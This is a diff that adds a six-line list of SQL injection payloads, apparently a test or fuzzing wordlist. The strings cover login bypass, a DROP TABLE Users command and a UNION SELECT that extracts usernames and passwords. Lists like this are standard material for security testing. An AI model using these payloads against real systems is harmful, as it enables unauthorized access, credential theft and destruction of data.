@@ -1,0 +1,6 @@
+' OR '1'='1
+\" OR \"1\"=\"1
+'; DROP TABLE Users; --
+' UNION SELECT null, username, password FROM Users --
+admin' --
+' OR 1=1 --
